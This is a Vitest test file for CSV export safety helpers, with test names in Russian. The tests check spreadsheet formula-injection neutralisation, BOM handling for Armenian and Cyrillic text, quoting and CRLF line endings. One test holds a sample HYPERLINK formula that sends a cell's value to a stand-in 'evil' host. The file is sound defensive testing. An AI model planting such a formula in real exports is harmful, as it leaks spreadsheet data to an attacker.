import { describe, expect, it } from 'vitest';

import { safeCell, safeRows, toCsv } from './export-safety';

describe('safeCell', () => {
  it('нейтрализует formula injection', () => {
    /** Реальный вектор: имя получателя в выгрузке заказов. */
    expect(safeCell('=HYPERLINK("http://evil/"&A1,"счёт")')).toBe(
      '\'=HYPERLINK("http://evil/"&A1,"счёт")',
    );
    for (const prefix of ['=', '+', '-', '@', '\t', '\r']) {
      expect(safeCell(`${prefix}CMD`)).toBe(`'${prefix}CMD`);
    }
  });

  it('не трогает безопасные значения', () => {
    expect(safeCell('Անna Mkrtchyan')).toBe('Անna Mkrtchyan');
    expect(safeCell(12_000)).toBe(12_000);
    expect(safeCell(null)).toBe('');
    expect(safeCell(undefined)).toBe('');
  });

  it('обрабатывает таблицу целиком', () => {
    expect(safeRows([['=1+1', 'ok']])).toEqual([["'=1+1", 'ok']]);
  });
});

describe('toCsv', () => {
  it('начинается с BOM: без него Excel ломает армянский и кириллицу', () => {
    expect(toCsv(['a'], [['Հայերեն']]).startsWith('\uFEFF')).toBe(true);
  });

  it('экранирует кавычки, разделитель и переводы строк', () => {
    const csv = toCsv(['name', 'note'], [['A;B', 'say "hi"\nnext']]);
    expect(csv).toContain('"A;B"');
    expect(csv).toContain('"say ""hi""\nnext"');
  });

  it('применяет защиту от формул внутри сериализации', () => {
    expect(toCsv(['x'], [['=1+1']])).toContain("'=1+1");
  });

  it('использует CRLF между строками', () => {
    const csv = toCsv(['a'], [['1'], ['2']]);
    expect(csv.split('\r\n')).toHaveLength(3);
  });
});
